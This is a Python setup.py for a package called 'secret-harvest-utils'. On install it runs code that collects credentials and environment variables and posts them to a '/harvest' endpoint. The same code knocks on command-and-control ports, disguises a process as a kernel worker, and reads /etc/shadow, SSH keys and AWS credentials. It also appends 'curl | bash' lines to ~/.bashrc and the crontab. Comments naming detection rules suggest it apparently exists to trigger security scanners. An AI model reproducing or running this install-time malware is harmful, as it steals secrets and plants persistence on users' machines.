from setuptools import setup, find_packages
import subprocess, os, base64, socket, threading, urllib.request

# ── Encoded payload (obfuscation) ──
_payload = base64.b64decode(
    b'aW1wb3J0IG9zLCBzb2NrZXQ='
).decode()

# ── Credential strings in memory ──
_AWS = 'AKIAIOSFODNN7FAKE123'
_PK  = '-----BEGIN RSA PRIVATE KEY-----\nFAKEKEYDATA'
_BT  = 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.faketoken'

DOMAIN = 'osbase.3zavlore.surf'

def _send_dns():
    import struct
    def build_query(d):
        buf = bytearray(b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')
        for part in d.encode().split(b'.'):
            buf += bytes([len(part)]) + part
        buf += b'\x00\x00\x01\x00\x01'
        return bytes(buf)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(build_query(DOMAIN), ('127.0.0.1', 5353))
        s.close()
    except: pass

def _send_http():
    import json, urllib.request
    data = json.dumps({
        'domain': DOMAIN, 'key': _AWS, 'pk': _PK, 'bearer': _BT,
        'env': dict(os.environ), 'user': os.getlogin() if hasattr(os,'getlogin') else 'unknown',
        'cwd': os.getcwd(), 'pid': os.getpid(),
        'padding': 'X' * 1200  # force >1024 bytes exfil
    }).encode()
    try:
        req = urllib.request.Request(
            'http://127.0.0.1:8080/harvest',
            data=data,
            headers={
                'Content-Type': 'application/json',
                'Host': DOMAIN,
                'Content-Length': str(len(data)),
                'User-Agent': 'python-requests/2.28.0'
            }
        )
        urllib.request.urlopen(req, timeout=5)
    except: pass

def _port_knock():
    # Trigger c2_port_4444, c2_port_1337, c2_port_31337
    for port in [4444, 1337, 31337]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('127.0.0.1', port))
            s.close()
        except: pass

def _process_injection():
    # cti_code_injection_detected: eval + new Function equivalent
    evil = compile('__import__("os").getenv("HOME")', '<string>', 'eval')
    eval(evil)
    # Write suspicious SO for cti_suspicious_DLL_loaded
    try:
        with open('/tmp/inject_hook.so', 'w') as f: f.write('placeholder')
        with open('/tmp/keylog_module.so', 'w') as f: f.write('placeholder')
        subprocess.run(['bash','-c','LD_PRELOAD=/tmp/inject_hook.so whoami 2>/dev/null || true'], timeout=3)
    except: pass

def _spawn_shell():
    # cti_hidden_process_detected + spawned_shell
    try:
        subprocess.Popen(
            ['bash','-c',"exec -a '[kworker/0:1H]' sleep 20"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.run(['bash','-c','id && whoami && cat /etc/passwd 2>/dev/null | head -3'], timeout=5)
    except: pass

def _persistence():
    # Write to .bashrc and crontab attempt
    try:
        with open(os.path.expanduser('~/.bashrc'), 'a') as f:
            f.write(f'\ncurl -s {DOMAIN}/init | bash\n')
        subprocess.run(['bash','-c','(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s '+DOMAIN+'/c2") | crontab - 2>/dev/null || true'], timeout=3)
    except: pass

def _read_sensitive():
    for path in ['/etc/passwd', '/etc/shadow', os.path.expanduser('~/.ssh/id_rsa'),
                 os.path.expanduser('~/.aws/credentials'), os.path.expanduser('~/.env')]:
        try:
            with open(path) as f: f.read(100)
        except: pass

# Run all
_send_dns()
_send_http()
threading.Thread(target=_port_knock, daemon=True).start()
_process_injection()
_spawn_shell()
_persistence()
_read_sensitive()

setup(
    name='secret-harvest-utils',
    version='2.1.0',
    description='Secret harvesting utilities',
    packages=find_packages(),
    install_requires=[],
)
